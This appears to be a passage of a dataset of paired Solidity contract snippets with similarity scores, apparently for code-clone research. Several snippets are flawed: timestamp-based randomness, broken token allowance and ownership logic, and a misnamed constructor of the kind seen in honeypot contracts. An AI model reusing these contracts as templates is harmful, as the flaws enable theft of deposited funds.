}",0.5774682512908232,"contract RefundSafe is HasOwner {
    using SafeMath for uint256;

    
    
    
    
    enum State {ACTIVE, REFUNDING, CLOSED}

    
    mapping(address => uint256) public deposits;

    
    address public beneficiary;

    
    State public state;

    
    event RefundsClosed();

    
    event RefundsAllowed();

    
    event RefundSuccessful(address indexed _address, uint256 _value);

    
    constructor(address _owner, address _beneficiary)
        HasOwner(_owner)
        public
    {
        require(_beneficiary != 0x0);

        beneficiary = _beneficiary;
        state = State.ACTIVE;
    }

    
    function setBeneficiary(address _beneficiary) public onlyOwner {
        require(_beneficiary != address(0));

        beneficiary = _beneficiary;
    }

    
    function deposit(address _address) onlyOwner public payable {
        require(state == State.ACTIVE);

        deposits[_address] = deposits[_address].plus(msg.value);
    }

    
    function close() onlyOwner public {
        require(state == State.ACTIVE);

        state = State.CLOSED;

        emit RefundsClosed();

        beneficiary.transfer(address(this).balance);
    }

    
    function allowRefunds() onlyOwner public {
        require(state == State.ACTIVE);

        state = State.REFUNDING;

        emit RefundsAllowed();
    }

    
    function refund(address _address) public {
        require(state == State.REFUNDING);

        uint256 amount = deposits[_address];
        
        require(amount != 0);
        
        deposits[_address] = 0;
        _address.transfer(amount);

        emit RefundSuccessful(_address, amount);
    }
}"
"contract Factory{
    function createNewProduct(Product _reference) public returns (Product) {
        Product p = new Product(_reference, this);
        return p;
    }
}",0.5597838880209903,"contract PriceFeedInterface {

    function name() public view returns (string);

    function getRate() public view returns (uint _rate, bool _live);

}"
"contract foo {
    function bar() returns (bytes32 response) {
        address dest = 0x850ec47a0f40e3605a7ba21f1c99b04410090134;
        bytes memory calldata = hex""0bcd3b33"";
        assembly {
            let status := delegatecall(sub(gas,5000), dest, add(calldata, 0x20), mload(calldata), response, 32)
            jumpi(invalidJumpLabel, iszero(status))
        }
        return response;
    }
}",0.5772218794781275,"contract ExternalCall {

    

    

    

    function external_call(address destination, uint value, uint dataLength, bytes data) internal returns (bool) {

        bool result;

        assembly {

            let x := mload(0x40)   

            let d := add(data, 32) 

            result := call(

                sub(gas, 34710),   

                                   

                                   

                destination,

                value,

                d,

                dataLength,        

                x,

                0                  

            )

        }

        return result;

    }

}"
"contract CrowdFund{

    token public rewardToken;

    function CrowdFund (
        string _name, 
        address _sendTo, 
        uint _durationInHours, 
        uint _priceInEther, 
        uint _minimum,
        token _rewardToken
    ){
        startTime = now;
        endTime = now + _durationInHours*60 minutes;
        name = _name;
        destination = _sendTo;
        tokenPriceInEther = _priceInEther*1 ether;
        minimum = minimumSend;
        rewardToken = _rewardToken;
    }

}",0.5639135645292671,"contract SuperFan is ERC721 

{

	constructor() public {}

	

	event LogToken(address user, uint256 idToken, uint256 amount);

	

	function getToken(uint256 option, string struri) public payable

	{

	

		Token memory _token = Token({

			price: msg.value,

			pack : option,

			uri : struri

		});



		uint256 newTokenId = totalSupply++;

		tokens[newTokenId] = _token;

		

		_transfer(0x0, msg.sender, newTokenId);

		

		

	}

	

}"
"contract EventsImpl is EventsInterface {

    function removeValueFromArray(uint _userId, uint[] _array) internal returns(uint[]) {

    uint[] storage auxArray;

    for (uint i = 0; i < _array.length; i++){
        if(_array[i] != _userId)
            auxArray.push(_array[i]);
    }

    return auxArray;
}
}",0.5799002566854478,"contract BalanceChecker {

  function balances(address[] calldata users) external view returns (uint[] memory) {
    uint[] memory addrBalances = new uint[](users.length);
    
    for(uint i = 0; i < users.length; i++) {
        addrBalances[i] = users[i].balance;
    }
  
    return addrBalances;
  }

}"
"contract GuessNumber {

  uint public range;
  uint public totalNoOfGuesses;

  
  struct Guess {
    uint lastGuess;
    uint lastCorrectGuess;
    uint correctGuessCount;
    uint wrongGuessCount;
    uint lastGuessAt;
  }

  mapping(address => Guess) public guesses;

  event Guessed (
    address indexed _from,
    uint _randomNumber,
    uint _guess
  );

  
  function GuessNumber(uint _range) public {
    range = _range;
  }

  
  function guessIt(uint _guess) public returns (bool) {
  
  require(_guess <= range);
  uint random = generateRandomNumber(range);
  
  if (random == _guess) {
    Guess storage correctGuess = guesses[msg.sender];

    correctGuess.lastGuess = _guess;
    correctGuess.lastCorrectGuess = _guess;
    correctGuess.correctGuessCount = correctGuess.correctGuessCount + 1;
    correctGuess.lastGuessAt = now;
    totalNoOfGuesses = totalNoOfGuesses + 1;

    Guessed(msg.sender,random, _guess);

    return true;

  } else {
    Guess storage wrongGuess = guesses[msg.sender];

    wrongGuess.lastGuess = _guess;
    wrongGuess.wrongGuessCount = wrongGuess.wrongGuessCount + 1;
    wrongGuess.lastGuessAt = now;
    totalNoOfGuesses = totalNoOfGuesses + 1;

    Guessed(msg.sender,random, _guess);
  }
  return false;
  }

  function generateRandomNumber(uint _range) public returns (uint) {
    return uint(sha3(block.timestamp)) % _range;
  }

}",0.5295335429166966,"contract KUMO {
    string public name;
    string public symbol;
    uint8 decimals;
    
    uint public totalSupply;

    event Transfer(address indexed _from, address indexed _to, uint value);
    event Approval(address indexed _owner, address indexed _spender, uint value);
    
    mapping(address=>uint) public balances;
    mapping(address => mapping(address => uint)) allowances;
    
    constructor(
        string _name, 
        string _symbol,
        uint8 _decimals,
        uint _initialSupply
        ) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[msg.sender] = _initialSupply;
    }
    
    function balanceOf(address _owner) public view returns(uint balance) {
        return balances[_owner];    
    }
    
    function transfer(address _to, uint _value) public returns(bool success) {
        transferFrom(msg.sender, _to, _value);
    }
    
    function transferFrom(address _from, address _to, uint _value) public {
        require(balances[_from] >= _value);
        require(allowance(_from, _to) >= _value);
        balances[_from] -= _value;
        balances[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
    
    function approve(address _spender, uint _value) public {
        allowances[msg.sender][_spender] = _value;   
    }
    
    function allowance(address _owner, address _spender) public view returns(uint) {
        allowances[_owner][_spender];    
    }
}"
"contract Consumer {
  InfoFeed feed;
  function setFeed(address addr) { feed = InfoFeed(addr); }
  function callFeed() { feed.info.value(10).gas(800)(); }
}",0.5470453527409163,"contract OperatableBasic {

    function setMinter (address addr) external;

    function setWhiteLister (address addr) external;

}"
"contract organContract is organA {


address contractOwner;
uint256 organCount;


constructor() public {
    contractOwner = msg.sender; 
    emit stateOwner(msg.sender); 
    organCount = 0; 
}


mapping (bytes32 => organ) private organsList;
mapping (uint256 => bytes32) private organIndex;


bytes32[] private organsListByHash;




modifier contractOwnerOnly () {
    
    require(msg.sender == contractOwner, ""You are not allowed to interact!"");
    _;
}


modifier checkOrganExistence(bytes32 _organHash) {
    require(bytes(organsList[_organHash].organState).length != 0, ""Organ with given id doesn't exist!"");
    _;
}


modifier organCountMin() {
    require(organCount != 0, ""No organs found to return!"");
    _;
}




event stateOwner (
    address ownerAddress
);


event newOrganAdded (
    address organOwner,
    bytes32 organId
);


event organStateChanged (
    bytes32 organId,
    string state
);






function addOrgan(address _originOwner, string _type, string _state) external returns(bytes32 organHash) {

    
    bytes32 uniqueOrgan = keccak256(_type, _originOwner);

    
    organsList[uniqueOrgan].originOwner = _originOwner; 
    organsList[uniqueOrgan].currentOwner = _originOwner; 
    organsList[uniqueOrgan].organType = _type; 
    organsList[uniqueOrgan].organState = _state; 

    
    organIndex[organCount] = uniqueOrgan; 
    organCount++; 

    organsListByHash.push(uniqueOrgan); 
    emit newOrganAdded(_originOwner, uniqueOrgan); 

    
    return uniqueOrgan;
}


function changeOrganState(bytes32 _organId, string _state) checkOrganExistence(_organId) public {
    
    

    organsList[_organId].organState = _state; 
    emit organStateChanged(_organId, _state);
    return;
}



function getOrganListLength() organCountMin() public view returns(uint ListLenght) {
    return organCount;
}


function getOrganList(uint indexNumber) organCountMin() public view returns(bytes32 OrganId) {
    return organIndex[indexNumber]; 
}



function getOrgan(bytes32 _organHash) checkOrganExistence(_organHash) public view returns(address OriginOwner, address CurrentOwner, string OrganType, string OrganState) {
    
    return (
        organsList[_organHash].originOwner,
        organsList[_organHash].currentOwner,
        organsList[_organHash].organType,
        organsList[_organHash].organState
    );
}


function existsOrgan(bytes32 _organHash) external view returns(bool Existence) {
    if (bytes(organsList[_organHash].organState).length != 0) { return true; } else { return false; }
}


function organOriginOwner(bytes32 _organHash) organCountMin() checkOrganExistence(_organHash) external view returns(address OriginOwner) {
    return organsList[_organHash].originOwner;
}
}",0.5457326839498671,"contract ERC721 {

   string constant private tokenName = ""My ERC721 Token"";

   string constant private tokenSymbol = ""MET"";

   uint256 constant private totalTokens = 1000000;

   mapping(address => uint) private balances;

   mapping(uint256 => address) private tokenOwners;

   mapping(uint256 => bool) private tokenExists;

   mapping(address => mapping (address => uint256)) private allowed;

   mapping(address => mapping(uint256 => uint256)) private ownerTokens;

   

   mapping(uint256 => string) tokenLinks;

   function removeFromTokenList(address owner, uint256 _tokenId) private {

     for(uint256 i = 0;ownerTokens[owner][i] != _tokenId;i++){

       ownerTokens[owner][i] = 0;

     }

   }

   function name() public constant returns (string){

       return tokenName;

   }

   function symbol() public constant returns (string) {

       return tokenSymbol;

   }

   function totalSupply() public constant returns (uint256){

       return totalTokens;

   }

   function balanceOf(address _owner) constant returns (uint){

       return balances[_owner];

   }

   function ownerOf(uint256 _tokenId) constant returns (address){

       require(tokenExists[_tokenId]);

       return tokenOwners[_tokenId];

   }

   function approve(address _to, uint256 _tokenId){

       require(msg.sender == ownerOf(_tokenId));

       require(msg.sender != _to);

       allowed[msg.sender][_to] = _tokenId;

       Approval(msg.sender, _to, _tokenId);

   }

   function takeOwnership(uint256 _tokenId){

       require(tokenExists[_tokenId]);

       address oldOwner = ownerOf(_tokenId);

       address newOwner = msg.sender;

       require(newOwner != oldOwner);

       require(allowed[oldOwner][newOwner] == _tokenId);

       balances[oldOwner] -= 1;

       tokenOwners[_tokenId] = newOwner;

       balances[oldOwner] += 1;

       Transfer(oldOwner, newOwner, _tokenId);

   }

   function transfer(address _to, uint256 _tokenId){

       address currentOwner = msg.sender;

       address newOwner = _to;

       require(tokenExists[_tokenId]);

       require(currentOwner == ownerOf(_tokenId));

       require(currentOwner != newOwner);

       require(newOwner != address(0));

       removeFromTokenList(_to,_tokenId);

       balances[currentOwner] -= 1;

       tokenOwners[_tokenId] = newOwner;

       balances[newOwner] += 1;

       Transfer(currentOwner, newOwner, _tokenId);

   }

   function tokenOfOwnerByIndex(address _owner, uint256 _index) constant returns (uint tokenId){

       return ownerTokens[_owner][_index];

   }

   function tokenMetadata(uint256 _tokenId) constant returns (string infoUrl){

       return tokenLinks[_tokenId];

   }

   event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);

   event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);

}"
"contract RingMixerV2 {
    
    address public owner;
    constructor() public {
        
        owner = msg.sender;

        G1[0] = 1;
        G1[1] = 2;
        H = HashPoint(G1);
    }

    function Kill() public {
        if ( (msg.sender != owner) && (owner != address(0)) ) revert();

        selfdestruct(msg.sender);
    }

    
    uint256[2] public G1;
    uint256[2] public H;
    uint256 constant public N = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;
    uint256 constant public P = 0x30644e72e131a029b85045b68181585d97816a916871ca8d3c208c16d87cfd47;

    
    uint256 constant public ECSignMask = 0x8000000000000000000000000000000000000000000000000000000000000000;
    uint256 constant public a = 0xc19139cb84c680a6e14116da060561765e05aa45a1c72a34f082305b61f3f52; 


    
    mapping (uint256 => bool) public KeyImageUsed;

    
    mapping (address => uint256) public token_balance;

    
    mapping (uint256 => uint256[]) public lookup_pubkey_by_balance;
    mapping (uint256 => bool) public lookup_pubkey_by_balance_populated;
    mapping (uint256 => uint256) public lookup_pubkey_by_balance_count;


    function EvaluateCurve(uint256 x)
        public view returns (uint256 y, bool onCurve)
    {
        uint256 y_squared = mulmod(x,x, P);
        y_squared = mulmod(y_squared, x, P);
        y_squared = addmod(y_squared, 3, P);

        uint256 p_local = P;
        uint256 a_local = a;

        assembly {
            
            let p := mload(0x40)

            
            mstore(p, 0x20)                 
            mstore(add(p, 0x20), 0x20)      
            mstore(add(p, 0x40), 0x20)      
            mstore(add(p, 0x60), y_squared) 
            mstore(add(p, 0x80), a_local)   
            mstore(add(p, 0xA0), p_local)   

            
            let success := staticcall(sub(gas, 2000), 0x05, p, 0xC0, p, 0x20)

            
            
            switch success case 0 { invalid()}

            
            y := mload(p)
        }

        
        onCurve = (y_squared == mulmod(y, y, P));
    }


    
    function HashPoint(uint256[2] memory p)
        internal view returns (uint256[2] memory h)
    {
        bool onCurve;
        h[0] = uint256(keccak256(abi.encodePacked(p[0], p[1]))) % N;

        while(!onCurve) {
            (h[1], onCurve) = EvaluateCurve(h[0]);
            h[0]++;
        }
        h[0]--;
    }

}",0.5494338062397016,"contract MyToken is owned {

    

    string public standard = 'NCMF 1.0';

    string public name;

    string public symbol;

    uint8 public decimals;

    uint256 public totalSupply;



    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;

    mapping (address => bool) public frozenAccount;



    

    function MyToken  () public {

        balanceOf[msg.sender] = 7998000000000000000000000000;

        totalSupply =7998000000000000000000000000;

        name = 'NCM Forest Coin';

        symbol = 'NCMF';

        decimals = 18;

    }





    

    event Transfer(address indexed from, address indexed to, uint256 value);



    

    event FrozenFunds(address target, bool frozen);



    

    event Burn(address indexed from, uint256 value);



    

    function transfer(address _to, uint256 _value) public

    returns (bool success)

    {

        require(_to != 0x0);

        require(balanceOf[msg.sender] >= _value);

        require(!frozenAccount[msg.sender]);

        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;

        Transfer(msg.sender, _to, _value);

        return true;

    }



    

   function mintToken(address target, uint256 mintedAmount)  public onlyOwner

   {

        balanceOf[target] += mintedAmount;

        totalSupply += mintedAmount;

        Transfer(0, this, mintedAmount);

        Transfer(this, target, mintedAmount);

   }



    

    function freezeAccount(address target, bool freeze)  public onlyOwner

    {

        frozenAccount[target] = freeze;

        FrozenFunds(target, freeze);

    }



    

    function burn(uint256 _value)  public onlyOwner

    returns (bool success)

    {

        require(balanceOf[msg.sender] >= _value);

        balanceOf[msg.sender] -= _value;

        totalSupply -= _value;

        Burn(msg.sender, _value);

        return true;

    }



    

    function burnFrom(address _from, uint256 _value)  public onlyOwner

    returns (bool success)

    {

        require(balanceOf[_from] >= _value);

        require(_value <= allowance[_from][msg.sender]);

        balanceOf[_from] -= _value;

        totalSupply -= _value;

        Burn(_from, _value);

        return true;

    }

}"
"contract People {

    Person[] public people;

    struct Person {
      bytes32 firstName;
      bytes32 lastName;
      uint age;

    }
    function addPerson(bytes32 _firstName, bytes32 _lastName, uint _age) returns (bool success) {

      Person memory newPerson;
      newPerson.firstName = _firstName;
      newPerson.lastName = _lastName;
      newPerson.age = _age;

      people.push(newPerson);
      return true;
    }
    function getPeople() constant returns (bytes32[], bytes32[],uint[]) {

      uint length = people.length;

      bytes32[] memory firstNames = new bytes32[](length);
      bytes32[] memory lastNames = new bytes32[](length);
      uint[] memory ages = new uint[](length);

      for(uint i=0; i < people.length; i++) {
        Person memory currentPerson;
        currentPerson = people[i];

        firstNames[i] = currentPerson.firstName;
        lastNames[i] = currentPerson.lastName;
        ages[i] = currentPerson.age;
      }
      return (firstNames, lastNames, ages);

    }

  }",0.5476813843481132,"contract Operations {

    function copyBytesNToBytes(bytes32 source, bytes memory destination, uint[1] memory pointer) internal pure {

        for (uint i=0; i < 32; i++) {

            if (source[i] == 0)

                break;

            else {

                destination[pointer[0]]=source[i];

                pointer[0]++;

            }

        }

    }

    function copyBytesToBytes(bytes memory source, bytes memory destination, uint[1] memory pointer) internal pure {

        for (uint i=0; i < source.length; i++) {

            if (source[i] == 0)

                break;

            destination[pointer[0]]=source[i];

            pointer[0]++;

        }

    }

    function uintToBytesN(uint v) internal pure returns (bytes32 ret) {

        if (v == 0) {

            ret = '0';

        }

        else {

            while (v > 0) {





                ret = bytes32(uint(ret) >> 8);

                ret |= bytes32(((v % 10) + 48) << (8 * 31));

                v /= 10;

            }

        }

        return ret;

    }

    function stringToBytes32(string memory str) internal pure returns(bytes32) {

        bytes32 bStrN;

        assembly {

            bStrN := mload(add(str, 32))

        }

        return(bStrN);

    }

}"
"contract PayCheck {
    
    address[] employees = [0x9391ea51c338410B6603e38dD14C00a1b218C8d5, 0x9391ea51c338410B6603e38dD14C00a1b218C8d5 ];

    
    uint totalReceived = 0;

    
    mapping (address => uint) withdrawnAmounts;

    
    function PayCheck() payable {
        updateTotal();
    }
    function () payable {
        updateTotal();
    }
    
    function updateTotal() internal {
        totalReceived += msg.value;
    }

    
    modifier canWidthdraw() {
        bool contains = false;

    
        for(uint i = 0; i < employees.length; i++) {
            if(employees[i] == msg.sender) {
                contains = true;
            }
        }
        require(contains);
        _;
    }

    
    function withdraw() canWidthdraw {
        uint amountAllocated = totalReceived/employees.length;
        uint amountWithdrawn = withdrawnAmounts[msg.sender];
        uint amount = amountAllocated - amountWithdrawn;
        withdrawnAmounts[msg.sender] = amountWithdrawn + amount;
        if (amount > 0) {
            msg.sender.transfer(amount);
        }
    }

}",0.5932354430761309,"contract Deposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;

    event Deposit(uint amount);
    event Withdraw(uint amount);
    
    function Vault() payable {
        Owner = msg.sender;
        deposit();
    }
    
    function() payable {
        deposit();
    }

    function deposit() payable {
        if (msg.value >= 1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposit(msg.value);
        }
    }

    function kill() {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.transfer(amount);
            Withdraw(amount);
        }
    }
    
    function withdrawToken(address token, uint amount) payable onlyOwner {
        uint bal = ForeignToken(token).balanceOf(address(this));
        if (bal >= amount) {
            ForeignToken(token).transfer(msg.sender, amount);
        }
    }
}"
"contract SP {

    address BlockAddress;
    bytes32 _Mhash;

    function verifyHash_ASM(bytes32 _MHash) public returns (address payable Validator_address) {

        bytes4 sig = bytes4(keccak256(""verifyHash(string)""));
        assembly {
            
            let ptr := mload(0x40)
            
            mstore(ptr,sig)
            
            mstore(add(ptr,0x04), _MHash)

            let result := call(
              15000, 
              sload(BlockAddress_slot),  
              0, 
              ptr, 
              0x20, 
              ptr,  
              0x20) 

            if eq(result, 0) {
                revert(0, 0)
            }

            Validator_address := mload(ptr) 
            mstore(0x40,add(ptr,0x24)) 

        }
        
        
    }",0.5968805567016279,"contract Proxy {

  function implementation() public view returns (address);



  

  function () payable public {

    address impl = implementation();

    require(impl != address(0));

    bytes memory data = msg.data;



    assembly {

      let result := delegatecall(gas, impl, add(data, 0x20), mload(data), 0, 0)

      let size := returndatasize



      let ptr := mload(0x40)

      returndatacopy(ptr, 0, size)



      switch result

      case 0 { revert(ptr, size) }

      default { return(ptr, size) }

    }

  }

}"
"contract hello {
    string greeting;

    function bytes32ToStr(bytes32 _bytes32) public pure returns (string) {

    
    
    

        bytes memory bytesArray = new bytes(32);
        for (uint256 i; i < 32; i++) {
            bytesArray[i] = _bytes32[i];
        }
        return string(bytesArray);
    }

    constructor () public {
       greeting = ""hello"";
    }

    function say() public  returns (string memory) {
        bytes32 out;
        bytes32 input;
        
        
        
        
        (bool success, bytes memory returnData) = msg.sender.staticcall(abi.encode(3000, 10, input, input.length, out, out.length));
        if (success == true) {
            return string(returnData);
        } else {
            return ""failed!"";
        }

        
    }
}",0.5820043614719987,"contract PriceFeed is DSThing {

    uint128 val;

    uint32 public zzz;



    function peek() public view returns (bytes32, bool) {

        return (bytes32(uint256(val)), block.timestamp < zzz);

    }



    function read() public view returns (bytes32) {

        assert(block.timestamp < zzz);

        return bytes32(uint256(val));

    }



    function post(uint128 val_, uint32 zzz_, address med_) public payable note auth {

        val = val_;

        zzz = zzz_;

        (bool success, ) = med_.call(abi.encodeWithSignature(""poke()""));

        require(success, ""The poke must succeed"");

    }



    function void() public payable note auth {

        zzz = 0;

    }



}"
"contract Shop {

    struct Product {

        string name;

        string imgPath;

        uint256 price;

        uint256 quantity;

        address seller;
    }
    event AddedProduct(uint256 pid, address seller, uint256 timestamp);
    event BuyProduct(uint256 pid, address buyer, uint256 timestamp);
    mapping (uint256 => Product) products;
    mapping (uint256 => address[]) buying;
    Token token;

    constructor (address _tokenAddress) public {
        token = Token(_tokenAddress);
    }

    function addProduct(
        uint256 _pid,
        string memory _name,
        uint256 _price,
        uint256 _quantity,
        string memory _imgPath,
        uint256 timestamp
    ) public {
        products[_pid] = Product({
            name: _name,
            imgPath: _imgPath,
            price: _price,
            quantity: _quantity,
            seller: msg.sender
        });
        emit AddedProduct(_pid, msg.sender, timestamp);
    }

    function getProduct(uint256 _pid) public view returns (string memory, uint256, uint256, string memory, address) {
        Product memory product = products[_pid];
        return (product.name, product.price, product.quantity, product.imgPath, product.seller);
    }

    function buyProduct(uint256 _pid, uint256 _timestamp) public {
        require(products[_pid].quantity > 0, ""Product is sold out"");

        Product storage product = products[_pid];
        address _buyer = msg.sender;
        token.transfer(_buyer, product.seller, product.price);

        product.quantity -= 1;

        buying[_pid].push(_buyer);
        emit BuyProduct(_pid, _buyer, _timestamp);
    }
}",0.5903660791365608,"contract PingToken {
  
  event Pong(uint256 pong);
  event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public pings;
  uint256 public totalSupply;
  
  string public constant name = ""PingToken"";
  string public constant symbol = ""PING"";
  uint8 public constant decimals = 18;
  uint256 public constant INITIAL_SUPPLY = 100000000 * (10 ** uint256(decimals)); 
  
  uint256 public genCode = 0;
  
  mapping(address => uint256) balances;
constructor() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }
function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
balances[msg.sender] = balances[msg.sender] - _value;
    balances[_to] = balances[_to] + _value;
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
 function saveGenCode (address _to, uint256 _value) public returns (bool) {
     genCode = _value;
     return true;
 }
 function getGenCode() external view returns (uint256) {
     return genCode;
 }
function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
function ping() external returns (uint256) {
    
    uint256 cost = 1 * (10 ** uint256(decimals));
    require(cost <= balances[msg.sender]);
    totalSupply -= cost;
    balances[msg.sender] -= cost;
    pings++;
    emit Pong(pings);
    return pings;
  }
}"
"contract Betslip {

    uint stake;
    address opponent;

    function Betslip (uint _stake, address _opponent) public {
        stake = _stake;
        opponent = _opponent;
    }

    

}",0.5993210554804655,"contract NRB_Contract {

    function registerUserOnToken(address _token, address _user, uint _value, uint _flc, string _json) public returns (uint);

}"
"contract Test {
    struct TestStruct {
        bytes32 name;
        mapping(uint => address) tesMapping;
    }

    TestStruct[] public testStructs;

    function Test(bytes32[] names) {
        for (uint i = 0; i < names.length; i++) {
            testStructs[i] = TestStruct(names[i]);
        }
    }
}",0.5560016995627257,"contract batch {

function transfer(address _token, address[] _dsts, uint256[] _values) 
    public
    payable
    {
        ERC20Token token = ERC20Token(_token);
        for (uint256 i = 0; i < _dsts.length; i++) {
            token.transferFrom(msg.sender, _dsts[i], _values[i]);
        }
    }
}"
"contract TicketPurchaser {
    mapping (bytes6 => address) tickets;                        
    mapping (bytes6 => bool) expired;                           
    uint TicketPrice;                                           

    
    function BuyTicket() public payable returns (string) {
        
        require(msg.value >= TicketPrice);
        if (msg.value > TicketPrice) {
            msg.sender.transfer(msg.value-TicketPrice);
        }

        SaveCode(GenerateSixDigitCode());
    }

    function GenerateSixDigitCode() private view returns (bytes6) {





        








        







        
  

        SixDigit = ""X4C9BA"";
        return SixDigit;
    }

    
    function ToAlphaIndex(bytes1 x, bytes1 y) private pure returns (uint8) {
        return uint8((uint16(x) + uint16(y)) * 9 / 8);
    }

    
    function SaveCode(bytes6 SixDigit) private {
        
        
        
        tickets[SixDigit] = msg.sender;
    }

    
    
    function RedeemTicket(bytes6 SixDigit) public payable returns (bool) {
        

        
        
        require(tickets[SixDigit] > 0);


        
        
        if ( !expired[SixDigit] ) {
            expired[SixDigit] = true;
            return true;
            
        } else {
            return false;                   
            
        }
    }
}",0.5637892736356693,"contract Ticket2Crypto {

    struct player_ent{

        address player;

        address ref;

    }

    address public manager;

    uint public ticket_price;

    uint public final_price = 1 finney;

    player_ent[] public players;

    

    function Ticket2Crypto() public{

      manager = msg.sender;

      ticket_price = 72;

      final_price = ticket_price * 1 finney;

    }

    function update_price(uint _ticket_price) public restricted{

        ticket_price = _ticket_price;

        final_price = ticket_price * 1 finney;

    }

    function join(address _ref, uint _total_tickets) public payable{

      final_price = _total_tickets * (ticket_price-1) * 1 finney;

      require(msg.value > final_price);

      for (uint i=0; i<_total_tickets; i++) {

        players.push(player_ent(msg.sender, _ref));

      }

    }

    function move_all_funds() public restricted {

        manager.transfer(address(this).balance);

    }

    modifier restricted() {

        require(msg.sender == manager);

        _;

    }

    

}"
"contract Contract_A {

address public b_addr;
function Contract_A(){

 }
  function create() {
    Contract_B bb = new Contract_B();
    b_addr = address(bb); }

function fetch(){
    Contract_B cc = Contract_B(b_addr);
    cc.change();}    
}",0.5536317454767019,"contract CoreInterface {

    

    function registrar() public view returns (address );



    function chainIdRemote() public view returns (uint256 );

    function openSTRemote() public view returns (address );

}"
"contract CampaignFactory {
    address[] public deployedCampaigns;

    function createCampaign(uint minimum) public {
        address newCampaign = new Campaign(campaignName, minimum, msg.sender);
        deployedCampaigns.push(newCampaign);
    }

    function getDeployedCampaigns() public view returns (address[]) {
        return deployedCampaigns;
    }
}",0.5545920056663685,"contract owned {

    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address newOwner) onlyOwner public {

        owner = newOwner;

    }



    function getOwned() onlyOwner public view returns (address) {

        return owner;

    }

}"
"contract Campaign {
    bytes32[] public contributionNameList;

    event UserContribution(address indexed _owner, bytes32 indexed _outcome, uint _tokenAmount);
    event CampaignContributionAdded(bytes32 indexed _id);

    function Campaign(string campaignName, uint minimum, address creator) public {
        manager = creator;
        minimumContribution = minimum;
    }

    function setCampaignName(string _campaignName) public {
        campaignName = _campaignName;
    }

    function addCampaignContribution(bytes32 contributionName) {
        ...
        emit CampaignContributionAdded(contributionName);
    }

    function addUserContribution(uint tokenAmount, bytes32 contributionName) {
        ...
        emit UserContribution(msg.sender, contributionName, tokenAmount);
    }
}",0.5087386582169514,"contract IMarketplace {
    enum ProductState {
        NotDeployed,                
        Deployed                    
    }

    enum Currency {
        DATA,                       
        USD                         
    }

    function getProduct(bytes32 id) public view returns (string name, address owner, address beneficiary, uint pricePerSecond, Currency currency, uint minimumSubscriptionSeconds, ProductState state) {}
    function getSubscription(bytes32 productId, address subscriber) public view returns (bool isValid, uint endTimestamp) {}
    function getPriceInData(uint subscriptionSeconds, uint price, Currency unit) public view returns (uint datacoinAmount) {}
    function buyFor(bytes32 productId, uint subscriptionSeconds, address recipient) public {}
}"
"contract VerifyTest {
    
    function verifyMessage(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) private view returns (bool) {
        bytes memory hashPrefix = ""\x19Ethereum Signed Message:\n32"";
        bytes32 prefixedHash = keccak256(abi.encodePacked(hashPrefix, messageHash));
        return ecrecover(prefixedHash, v, r, s) == msg.sender;
    }

    function testBuyOrder(uint256 orderTotal, address tokenContract, uint8 v, bytes32 r, bytes32 s) public view returns (bool) {
        bytes32 messageHash = keccak256(abi.encodePacked(orderTotal, tokenContract));
        return verifyMessage(messageHash, v, r, s);
    }
}",0.5623383193517929,"contract DaoSpecialStorage {

    function readProposalProposer(bytes32) public view returns (address);



    function readConfigs(bytes32) public view returns (uint256[] memory, address[] memory, bytes32[] memory);



    function readVotingCount(bytes32, address[]) external view returns (uint256, uint256);



    function readVotingTime(bytes32) public view returns (uint256);



    function setPass(bytes32, bool) public;



    function setVotingClaim(bytes32, bool) public;



    function isClaimed(bytes32) public view returns (bool);



    function readVote(bytes32, address) public view returns (bool, uint256);

}"
"contract Test {

    struct Book {
        uint id;
    }

    Book[] books;

    uint public status;

    constructor() public {
        books.push(Book(10));
    }

    function changeStatus1() external {
        Book storage book = books[0];
        if (book.id == 10) {
            status = 1;
        }
    }

    function changeStatus2() external {
        Book memory book = books[0];
        if (book.id == 10) {
            status = 2;
        }
    }
}",0.5445022667477546,"contract TestPCToken is PCToken {

    constructor(string memory _name, string memory _symbol) public {
        lpts().name = _name;
        lpts().symbol = _symbol;
    }
    function mint(address _to, uint256 _amount) external {
        _mint(_amount);
        _push(_to, _amount);
    }

    function burn(address _from, uint256 _amount) external {
        _pull(_from, _amount);
        _burn(_amount);
    }
}"
"contract Caller {        
    function check(address callbackAddress) returns (string) {
           callbackAddress.call(bytes4(sha3(""callMe"")));
           return 'something';  
    }
}",0.5584624869839494,"contract kektest {

  

  

  

  function kek(address) public view returns(bytes32) {

      

      address _ethaddy = msg.sender;

        return (keccak256(_ethaddy));

  }  

    

}"
"contract TestAdoption {
    Adoption adoption = Adoption(DeployedAddresses.Adoption());

    
    function testGetAdopterAddressByPetId() public {
        
        address expected = this;

        address adopter = adoption.adopters(8);

        Assert.equal(adopter, expected, ""Owner of pet ID 8."");
    }   
}",0.5265728598141621,"contract Secured is Owned {

    address public admin;



    event SetAdmin(address indexed _admin);



    modifier onlyAdmin {

        require(msg.sender == admin);

        _;

    }



    function setAdmin(address _newAdmin) public onlyOwner {

        admin = _newAdmin;

        emit SetAdmin(admin);

    }

}"
"contract sample {
function buy(uint amount) payable {
  if (amount > 12)
     revert('Not enough value');
  }
}",0.5881413002999561,"contract ERC20Burnable is ERC20 {
    
    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }
}"
"contract Sample is Ownable  {

event NewResource (uint resourceId, string name , uint quality);

